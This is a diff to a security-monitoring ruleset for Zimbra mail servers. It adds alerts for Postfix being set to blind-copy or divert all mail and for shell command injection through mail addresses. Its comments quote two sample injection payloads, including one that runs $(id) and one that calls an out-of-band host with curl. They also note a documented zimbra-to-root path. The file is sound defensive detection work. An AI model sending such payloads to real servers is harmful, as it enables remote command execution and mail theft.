@@ -31,12 +31,36 @@
        mailbox_command, transports, sendmail_path...): rewriting one of those
        and restarting Postfix is the documented way from the zimbra account
        to root.
+
+       3.2: those settings are quiet when zmconfigd writes Zimbra's stock
+       value, the one every Zimbra install has (localconfig and attribute
+       defaults: /opt/zimbra/common/... paths, proxy:ldap:/opt/zimbra/conf/
+       ldap-transport.cf, postfix/postdrop, amavis on 127.0.0.1:10024, the
+       Zimbra milter on 127.0.0.1:7026, an empty value where Zimbra sets
+       none). zmconfigd rewrites them on every configuration pass: about 60
+       visible 5402 alerts a day on two measured servers came from these
+       alone. Any other value stays at 5402.
        ========================================================== -->
 
   <rule id="100866" level="1">
     <if_sid>5402</if_sid>
-    <regex type="pcre2">^\s*zimbra : TTY=\S+ ; PWD=\S+ ; USER=root ; COMMAND=(?:/opt/zimbra/libexec/zmmailboxdmgr status|/opt/zimbra/libexec/zmmtastatus|/opt/zimbra/libexec/zmqstat(?: all)?|/opt/zimbra/libexec/zmstat-fd(?: \S+)*|/opt/zimbra/common/sbin/postconf -[eX] (?!(?:\S*_directory|mailbox_command|mailbox_transport|local_transport|default_transport|relay_transport|virtual_transport|transport_maps|fallback_transport|mailbox_command_maps|sendmail_path|mailq_path|newaliases_path|import_environment|export_environment|mail_owner|setgid_group|default_privs|content_filter|smtpd_milters|non_smtpd_milters)\b)[a-z_0-9]+(?:=.*)?)$</regex>
+    <regex type="pcre2">^\s*zimbra : TTY=\S+ ; PWD=\S+ ; USER=root ; COMMAND=(?:/opt/zimbra/libexec/zmmailboxdmgr status|/opt/zimbra/libexec/zmmtastatus|/opt/zimbra/libexec/zmqstat(?: all)?|/opt/zimbra/libexec/zmstat-fd(?: \S+)*|/opt/zimbra/common/sbin/postconf -[eX] (?!(?:\S*_directory|mailbox_command|mailbox_transport|local_transport|default_transport|relay_transport|virtual_transport|transport_maps|fallback_transport|mailbox_command_maps|sendmail_path|mailq_path|newaliases_path|import_environment|export_environment|mail_owner|setgid_group|default_privs|content_filter|smtpd_milters|non_smtpd_milters|always_bcc|sender_bcc_maps|recipient_bcc_maps|smtpd_proxy_filter)\b)[a-z_0-9]+(?:=.*)?|/opt/zimbra/common/sbin/postconf -e (?:daemon_directory=/opt/zimbra/common/libexec|command_directory=/opt/zimbra/common/sbin|manpage_directory=/opt/zimbra/common/share/man|queue_directory=/opt/zimbra/data/postfix/spool|transport_maps=proxy:ldap:/opt/zimbra/conf/ldap-transport\.cf|sendmail_path=/opt/zimbra/common/sbin/sendmail|mailq_path=/opt/zimbra/common/sbin/mailq|newaliases_path=/opt/zimbra/common/sbin/newaliases|import_environment=|mail_owner=postfix|setgid_group=postdrop|content_filter=(?:smtp-amavis:\[127\.0\.0\.1\]:10024)?|smtpd_milters=(?:inet:127\.0\.0\.1:7026)?|non_smtpd_milters=|virtual_transport=error))$</regex>
     <description>Zimbra service account ran one of its own status or configuration helpers through sudo (routine)</description>
+  </rule>
+
+  <!-- 3.2: a sudo postconf that copies or diverts all mail: always_bcc,
+       sender_bcc_maps, recipient_bcc_maps (a blind copy of every message)
+       or smtpd_proxy_filter (every incoming message through another
+       program). Zimbra manages none of these, so they never come from
+       zmconfigd. An empty value (removing it) stays at 5402. -->
+  <rule id="100804" level="12">
+    <if_sid>5402</if_sid>
+    <regex type="pcre2">COMMAND=\S*postconf -e (?:\S+ )*(?:always_bcc|sender_bcc_maps|recipient_bcc_maps|smtpd_proxy_filter)=\S</regex>
+    <description>[HIGH] Postfix set to copy or divert every message (bcc or proxy filter) through sudo: $(srcuser) ran $(command)</description>
+    <mitre>
+      <id>T1114.002</id>
+    </mitre>
+    <group>exfiltration,</group>
   </rule>
 
   <!-- The PAM session lines that go with those commands carry no account
@@ -157,7 +181,9 @@
        localconfig.xml (100943).
        ========================================================== -->
 
-  <rule id="100876" level="0">
+  <!-- 3.2: level 1, not 0, for the same reason as 100800: a level 0 rule
+       is tried before the hash-list rules beside it (100141, 99901). -->
+  <rule id="100876" level="1">
     <if_sid>550</if_sid>
     <field name="file" type="pcre2">^/opt/zimbra/conf/(?!localconfig\.xml$)</field>
     <field name="changed_fields" type="pcre2">^(?:mtime|inode)(?:,(?:mtime|inode))?$</field>
@@ -454,6 +480,59 @@
     <match type="pcre2">(?i)^(?:ERROR|CRITICAL)\b|\bTraceback\b|failed to (?:rewrite|restart)</match>
     <description>Zimbra zmconfigd reported an error rewriting configuration or restarting a service</description>
     <group>service_availability,</group>
+  </rule>
+
+</group>
+
+<!-- ==========================================================
+     3.2: shell syntax in a mail address (zimbra.log)
+
+     CVE-2026-73570 (CISA KEV 2026-08-21, fixed in 10.1.20): swatchdog
+     watches /var/log/zimbra.log for zmconfigd's "Service status change:
+     <host> <service> changed from stopped to running" with an unanchored
+     pattern and passes the service name to a shell for snmptrap. An
+     attacker who gets that text into zimbra.log runs commands as zimbra
+     without logging in; Postfix writes it there itself when it rejects the
+     address (SecureLayer7, 2026):
+       NOQUEUE: reject: RCPT from unknown[203.0.113.5]: 501 5.1.3 Bad recipient address syntax; to=<"x: Service status change: localhost $(id) changed from stopped to running"@example.com>
+     CVE-2024-45519 (postjournal, KEV 2024-10-03) uses the same channel:
+       to=<"aabbb$(curl${IFS}oast.me)"@example.com>
+     Only zmconfigd writes "Service status change:" legitimately (7 lines
+     in 9 days on two servers, all zmconfigd). No address on either server
+     contained "$(", "${" or a backtick in 171,515 Postfix lines.
+     The rules hang off every Postfix rule (if_group) and amavis, which
+     repeats the envelope addresses.
+     ========================================================== -->
+<group name="zimbra,exploit_attempt,">
+
+  <rule id="100986" level="14">
+    <if_group>postfix</if_group>
+    <match>Service status change:</match>
+    <description>[HIGH] A forged Zimbra service-status line inside a Postfix log line, the CVE-2026-73570 command injection through swatchdog: $(srcip)</description>
+    <mitre>
+      <id>T1190</id>
+      <id>T1059.004</id>
+    </mitre>
+  </rule>
+
+  <rule id="100980" level="13">
+    <if_group>postfix</if_group>
+    <regex type="pcre2">\b(?:from|to|orig_to)=\x3c[^\x3e]*?(?:\$\(|\$\{|\x60)</regex>
+    <description>[HIGH] Shell command syntax in a mail address seen by Postfix, a command injection attempt (CVE-2024-45519, CVE-2026-73570 class): $(srcip)</description>
+    <mitre>
+      <id>T1190</id>
+      <id>T1059.004</id>
+    </mitre>
+  </rule>
+
+  <rule id="100987" level="13">
+    <if_sid>100944</if_sid>
+    <regex type="pcre2">Service status change:|\x3c[^\x3e]*?(?:\$\(|\$\{|\x60)[^\x3e]*\x3e</regex>
+    <description>[HIGH] Shell command syntax or a forged Zimbra service-status line in a mail address seen by amavis, a command injection attempt: $(zimbra.sender) to $(zimbra.rcpt) from $(srcip)</description>
+    <mitre>
+      <id>T1190</id>
+      <id>T1059.004</id>
+    </mitre>
   </rule>
 
 </group>
